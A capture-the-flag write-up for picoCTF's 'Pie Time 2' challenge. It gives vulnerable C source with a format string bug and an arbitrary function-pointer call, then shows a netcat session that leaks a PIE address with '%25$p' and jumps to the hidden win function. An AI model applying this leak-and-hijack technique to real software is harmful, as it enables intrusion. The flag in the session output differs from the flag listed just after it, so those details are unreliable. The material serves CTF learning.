# [Pie Time 2 (Binary Exploitation, Medium)](https://play.picoctf.org/practice/challenge/491) - 
- Description: Can you try to get the flag? I'm not revealing anything anymore!!
 - `vuln.c`
 ```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <signal.h>
 #include <unistd.h>
 
 void segfault_handler() {
   printf("Segfault Occurred, incorrect address.\n");
   exit(0);
 }
 
 void call_functions() {
   char buffer[64];
   printf("Enter your name:");
   fgets(buffer, 64, stdin);
   printf(buffer);
 
   unsigned long val;
   printf(" enter the address to jump to, ex => 0x12345: ");
   scanf("%lx", &val);
 
   void (*foo)(void) = (void (*)())val;
   foo();
 }
 
 int win() {
   FILE *fptr;
   char c;
 
   printf("You won!\n");
   // Open file
   fptr = fopen("flag.txt", "r");
   if (fptr == NULL)
   {
       printf("Cannot open file.\n");
       exit(0);
   }
 
   // Read contents from file
   c = fgetc(fptr);
   while (c != EOF)
   {
       printf ("%c", c);
       c = fgetc(fptr);
   }
 
   printf("\n");
   fclose(fptr);
 }
 
 int main() {
   signal(SIGSEGV, segfault_handler);
   setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered
 
   call_functions();
   return 0;
 }
 ```
 - Hint 1: What vulnerability can be exploited to leak the address?
 - Hint 2: Please be mindful of the size of pointers in this binary
 - Solution:
 - C program with a format string vulnerability, an arbitrary function call via a user-supplied address, a PIE (Position Independent Executable) enabled (function addresses change every run)
 - Goal: Call hidden `win` function to print the flag
 - `printf(buffer);`: User input is directly passed to `printf`, allowing memory leaks using format specifiers like `%p`
 - `void (*foo)(void) = (void (*)())val;`: User controls `val`, which is cast to a function pointer and called (allowing arbitrary code execution if you supply a valid function address)
 ```bash
 schufot-picoctf@webshell:~$ nc rescued-float.picoctf.net 59092
 Enter your name:%25$p
 0x63e485ca3400
  enter the address to jump to, ex => 0x12345: 0x63e485ca336a
 You won!
 picoCTF{p13_5h0u1dn'7_134k_9650b792}
 ```
- Flag: `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_31cc212b}`
- Explanation:
